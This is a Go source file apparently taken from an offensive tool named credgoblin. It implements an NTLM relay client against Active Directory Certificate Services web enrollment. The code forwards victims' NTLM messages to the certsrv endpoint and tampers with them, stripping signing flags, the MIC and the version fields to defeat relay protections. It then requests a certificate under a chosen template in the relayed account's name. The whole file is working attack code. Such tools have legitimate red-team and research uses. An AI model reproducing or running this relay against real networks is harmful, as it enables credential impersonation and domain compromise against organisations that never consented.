package relay

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"

	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// ADCSClient handles HTTP connections to ADCS with NTLM authentication
type ADCSClient struct {
	targetURL     string
	templateName  string
	logger        *output.Logger
	httpClient    *http.Client
	authReq       *http.Request
	authenticated bool
}

// NewADCSClient creates a new ADCS client
func NewADCSClient(targetURL, templateName string, logger *output.Logger) *ADCSClient {
	return &ADCSClient{
		targetURL:    targetURL,
		templateName: templateName,
		logger:       logger,
	}
}

// Connect establishes connection to ADCS server and validates it's reachable
func (c *ADCSClient) Connect() error {
	c.logger.Debug(fmt.Sprintf("Connecting to ADCS: %s", c.targetURL))

	// Parse URL
	target := c.targetURL
	if !strings.Contains(target, "://") {
		target = "http://" + target
	}

	u, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("invalid ADCS URL: %w", err)
	}

	// Ensure we have a proper path
	if u.Path == "" || u.Path == "/" {
		u.Path = "/certsrv/"
	}
	c.targetURL = u.String()

	// Create HTTP client with custom transport for NTLM
	jar, _ := cookiejar.New(nil)
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	c.httpClient = &http.Client{
		Transport: transport,
		Jar:       jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Test connection with a simple request
	req, err := http.NewRequest("GET", c.targetURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to connect to ADCS: %w", err)
	}
	defer resp.Body.Close()

	// Check if NTLM auth is available
	authHeader := resp.Header.Get("WWW-Authenticate")
	if resp.StatusCode == 401 && strings.Contains(authHeader, "NTLM") {
		c.logger.Debug("ADCS endpoint supports NTLM authentication")
		return nil
	}

	if resp.StatusCode == 200 {
		c.logger.Debug("ADCS endpoint accessible (no auth required or already authenticated)")
		return nil
	}

	return fmt.Errorf("ADCS endpoint returned unexpected status: %d (WWW-Authenticate: %s)", resp.StatusCode, authHeader)
}

// ForwardNegotiate forwards NTLM Type 1 message and returns Type 2 challenge
func (c *ADCSClient) ForwardNegotiate(type1 []byte) ([]byte, error) {
	c.logger.Debug("Forwarding NTLM Type 1 to ADCS")

	// Remove signing flags from Type 1
	modifiedType1 := c.removeSigningFlags(type1)

	// Base64 encode the NTLM Type 1
	ntlmHeader := "NTLM " + base64.StdEncoding.EncodeToString(modifiedType1)

	// Create request
	req, err := http.NewRequest("GET", c.targetURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Authorization", ntlmHeader)

	// Send request
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to send NTLM Type 1: %w", err)
	}
	defer resp.Body.Close()

	// Expect 401 with NTLM challenge
	if resp.StatusCode != 401 {
		return nil, fmt.Errorf("unexpected status code: %d (expected 401)", resp.StatusCode)
	}

	// Extract NTLM Type 2 from WWW-Authenticate header
	authHeader := resp.Header.Get("WWW-Authenticate")
	if !strings.HasPrefix(authHeader, "NTLM ") {
		return nil, fmt.Errorf("no NTLM challenge in response: %s", authHeader)
	}

	type2Base64 := strings.TrimPrefix(authHeader, "NTLM ")
	type2, err := base64.StdEncoding.DecodeString(type2Base64)
	if err != nil {
		return nil, fmt.Errorf("failed to decode NTLM Type 2: %w", err)
	}

	// Verify it's a valid NTLM Type 2 message
	if len(type2) < 12 {
		return nil, fmt.Errorf("NTLM Type 2 too short")
	}

	// Check signature
	if string(type2[0:8]) != "NTLMSSP\x00" {
		return nil, fmt.Errorf("invalid NTLM signature in Type 2")
	}

	// Check message type
	msgType := binary.LittleEndian.Uint32(type2[8:12])
	if msgType != 2 {
		return nil, fmt.Errorf("expected NTLM Type 2, got type %d", msgType)
	}

	c.logger.Debug(fmt.Sprintf("Received NTLM Type 2 challenge (%d bytes)", len(type2)))

	return type2, nil
}

// ForwardAuthenticate forwards NTLM Type 3 message to complete authentication
func (c *ADCSClient) ForwardAuthenticate(type3 []byte) error {
	c.logger.Debug("Forwarding NTLM Type 3 to ADCS")

	// Remove MIC and signing flags from Type 3
	modifiedType3 := c.removeMICFromType3(type3)

	// Base64 encode the NTLM Type 3
	ntlmHeader := "NTLM " + base64.StdEncoding.EncodeToString(modifiedType3)

	// Create request
	req, err := http.NewRequest("GET", c.targetURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Authorization", ntlmHeader)

	// Save this request for later use (to maintain session)
	c.authReq = req

	// Send request
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send NTLM Type 3: %w", err)
	}
	defer resp.Body.Close()

	// Check for successful authentication
	if resp.StatusCode == 401 {
		return fmt.Errorf("NTLM authentication failed (401 Unauthorized)")
	}

	if resp.StatusCode != 200 && resp.StatusCode != 302 {
		return fmt.Errorf("unexpected status code after auth: %d", resp.StatusCode)
	}

	c.authenticated = true
	c.logger.Debug("NTLM authentication successful")

	return nil
}

// RequestCertificate submits a CSR to ADCS and retrieves the issued certificate
func (c *ADCSClient) RequestCertificate(privateKey *rsa.PrivateKey, subjectCN string) (*x509.Certificate, error) {
	if !c.authenticated {
		return nil, fmt.Errorf("not authenticated")
	}

	c.logger.Debug(fmt.Sprintf("Requesting certificate with template: %s", c.templateName))

	// Generate PKCS#10 CSR
	csrTemplate := &x509.CertificateRequest{
		Subject: pkix.Name{
			CommonName: subjectCN,
		},
		SignatureAlgorithm: x509.SHA256WithRSA,
	}

	csrDER, err := x509.CreateCertificateRequest(rand.Reader, csrTemplate, privateKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create CSR: %w", err)
	}

	// Base64 encode CSR
	csrBase64 := base64.StdEncoding.EncodeToString(csrDER)

	// Build form data for certfnsh.asp
	formData := url.Values{
		"Mode":             {"newreq"},
		"CertRequest":      {csrBase64},
		"CertAttrib":       {"CertificateTemplate:" + c.templateName},
		"TargetStoreFlags": {"0"},
		"SaveCert":         {"yes"},
	}

	// Construct URL for certificate request
	submitURL := strings.TrimSuffix(c.targetURL, "/") + "/certfnsh.asp"

	// Create POST request
	req, err := http.NewRequest("POST", submitURL, strings.NewReader(formData.Encode()))
	if err != nil {
		return nil, fmt.Errorf("failed to create certificate request: %w", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send request
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to submit certificate request: %w", err)
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	bodyStr := string(body)

	// Check for errors in response
	if strings.Contains(bodyStr, "Access is denied") {
		return nil, fmt.Errorf("access denied - user may not have enrollment rights for template %s", c.templateName)
	}

	if strings.Contains(bodyStr, "The requested certificate template is not supported") {
		return nil, fmt.Errorf("certificate template '%s' not found or not supported", c.templateName)
	}

	if strings.Contains(bodyStr, "Denied by Policy Module") {
		return nil, fmt.Errorf("certificate request denied by policy - template may require manager approval")
	}

	// Extract request ID from response
	// Look for pattern like: certnew.cer?ReqID=123
	reqIDRegex := regexp.MustCompile(`ReqID=(\d+)`)
	matches := reqIDRegex.FindStringSubmatch(bodyStr)
	if len(matches) < 2 {
		// Try alternative pattern
		reqIDRegex2 := regexp.MustCompile(`name="ReqID"\s+value="(\d+)"`)
		matches = reqIDRegex2.FindStringSubmatch(bodyStr)
		if len(matches) < 2 {
			c.logger.Debug(fmt.Sprintf("Response body: %s", bodyStr))
			return nil, fmt.Errorf("could not find request ID in response")
		}
	}

	reqID := matches[1]
	c.logger.Debug(fmt.Sprintf("Certificate request ID: %s", reqID))

	// Fetch the issued certificate
	certURL := fmt.Sprintf("%s/certnew.cer?ReqID=%s&Enc=b64", strings.TrimSuffix(c.targetURL, "/"), reqID)
	certReq, err := http.NewRequest("GET", certURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create cert fetch request: %w", err)
	}

	certResp, err := c.httpClient.Do(certReq)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch certificate: %w", err)
	}
	defer certResp.Body.Close()

	certBody, err := io.ReadAll(certResp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read certificate response: %w", err)
	}

	// Check if we got a pending response
	if strings.Contains(string(certBody), "pending") || strings.Contains(string(certBody), "Pending") {
		return nil, fmt.Errorf("certificate request is pending manager approval (Request ID: %s)", reqID)
	}

	// Parse the certificate
	// The response might be base64 encoded DER or PEM
	certData := strings.TrimSpace(string(certBody))

	// Try to decode as base64
	var certDER []byte
	if strings.Contains(certData, "-----BEGIN CERTIFICATE-----") {
		// PEM format - extract the base64 part
		pemStart := strings.Index(certData, "-----BEGIN CERTIFICATE-----")
		pemEnd := strings.Index(certData, "-----END CERTIFICATE-----")
		if pemStart >= 0 && pemEnd > pemStart {
			base64Data := certData[pemStart+27 : pemEnd]
			base64Data = strings.ReplaceAll(base64Data, "\n", "")
			base64Data = strings.ReplaceAll(base64Data, "\r", "")
			certDER, err = base64.StdEncoding.DecodeString(base64Data)
			if err != nil {
				return nil, fmt.Errorf("failed to decode PEM certificate: %w", err)
			}
		}
	} else {
		// Assume raw base64 DER
		certDER, err = base64.StdEncoding.DecodeString(certData)
		if err != nil {
			return nil, fmt.Errorf("failed to decode certificate: %w", err)
		}
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("failed to parse certificate: %w", err)
	}

	c.logger.Success(fmt.Sprintf("Successfully obtained certificate (Subject: %s)", cert.Subject.CommonName))

	return cert, nil
}

// Close closes the ADCS connection
func (c *ADCSClient) Close() error {
	// Nothing to explicitly close for HTTP client
	return nil
}

// removeSigningFlags removes signing-related flags from NTLM Type 1
func (c *ADCSClient) removeSigningFlags(type1 []byte) []byte {
	if len(type1) < 20 {
		return type1
	}

	modified := make([]byte, len(type1))
	copy(modified, type1)

	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
	)

	flags := binary.LittleEndian.Uint32(modified[12:16])

	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_SIGN flag from Type 1")
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag from Type 1")
	}

	binary.LittleEndian.PutUint32(modified[12:16], flags)
	return modified
}

// removeMICFromType3 removes MIC and other problematic fields from NTLM Type 3
func (c *ADCSClient) removeMICFromType3(type3 []byte) []byte {
	if len(type3) < 88 {
		return type3
	}

	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
		NTLMSSP_NEGOTIATE_KEY_EXCH    = 0x40000000
		NTLMSSP_NEGOTIATE_VERSION     = 0x02000000
	)

	flags := binary.LittleEndian.Uint32(type3[60:64])

	originalFlags := flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_KEY_EXCH != 0 {
		flags ^= NTLMSSP_NEGOTIATE_KEY_EXCH
	}

	hasVersion := (originalFlags & NTLMSSP_NEGOTIATE_VERSION) != 0

	if hasVersion {
		flags ^= NTLMSSP_NEGOTIATE_VERSION

		modified := make([]byte, len(type3))
		copy(modified, type3)

		binary.LittleEndian.PutUint32(modified[60:64], flags)

		sessKeyLen := binary.LittleEndian.Uint16(modified[52:54])
		sessKeyOffset := binary.LittleEndian.Uint32(modified[56:60])
		hasSessionKey := (originalFlags&NTLMSSP_NEGOTIATE_KEY_EXCH) != 0 && sessKeyLen > 0

		if hasSessionKey {
			binary.LittleEndian.PutUint16(modified[52:54], 0)
			binary.LittleEndian.PutUint16(modified[54:56], 0)
		}

		bytesToSkip := 24
		if hasSessionKey {
			bytesToSkip += int(sessKeyLen)
		}

		offsetPositions := []int{16, 24, 32, 40, 48, 56}

		for _, pos := range offsetPositions {
			if pos+4 <= len(modified) {
				offset := binary.LittleEndian.Uint32(modified[pos : pos+4])
				if offset >= 88 {
					offset -= 24
					if hasSessionKey && offset >= sessKeyOffset {
						offset -= uint32(sessKeyLen)
					}
					binary.LittleEndian.PutUint32(modified[pos:pos+4], offset)
				}
			}
		}

		final := make([]byte, 0, len(type3)-bytesToSkip)
		final = append(final, modified[0:64]...)

		if hasSessionKey && sessKeyOffset > 88 {
			final = append(final, modified[88:sessKeyOffset]...)
			final = append(final, modified[sessKeyOffset+uint32(sessKeyLen):]...)
		} else {
			final = append(final, modified[88:]...)
		}

		final = c.clearMICFlagInAVPairs(final)

		c.logger.Debug(fmt.Sprintf("Removed MIC, VERSION, and signing flags from Type 3 (removed %d bytes)", bytesToSkip))
		return final
	}

	modified := make([]byte, len(type3))
	copy(modified, type3)
	binary.LittleEndian.PutUint32(modified[60:64], flags)

	c.logger.Debug("Removed signing flags from Type 3 (no VERSION/MIC to remove)")
	return modified
}

// clearMICFlagInAVPairs clears the MIC Present flag in the AV_PAIRS
func (c *ADCSClient) clearMICFlagInAVPairs(type3 []byte) []byte {
	if len(type3) < 28 {
		return type3
	}

	ntlmRespLen := binary.LittleEndian.Uint16(type3[20:22])
	ntlmRespOffset := binary.LittleEndian.Uint32(type3[24:28])

	if ntlmRespOffset+uint32(ntlmRespLen) > uint32(len(type3)) {
		c.logger.Debug("Invalid NTLM response offset/length, skipping AV_PAIRS modification")
		return type3
	}

	if ntlmRespLen < 44 {
		c.logger.Debug("NTLMv2 response too short for AV_PAIRS")
		return type3
	}

	modified := make([]byte, len(type3))
	copy(modified, type3)

	avPairsStart := ntlmRespOffset + 44
	offset := avPairsStart

	for offset < ntlmRespOffset+uint32(ntlmRespLen)-4 {
		avID := binary.LittleEndian.Uint16(modified[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(modified[offset+2 : offset+4])

		if avID == 0 {
			break
		}

		if avID == 6 && avLen == 4 {
			flags := binary.LittleEndian.Uint32(modified[offset+4 : offset+8])
			const MIC_PRESENT = 0x00000002

			if flags&MIC_PRESENT != 0 {
				flags &^= MIC_PRESENT
				binary.LittleEndian.PutUint32(modified[offset+4:offset+8], flags)
				c.logger.Debug("Cleared MIC Present flag in AV_PAIRS")
			}
			break
		}

		offset += 4 + uint32(avLen)
	}

	return modified
}
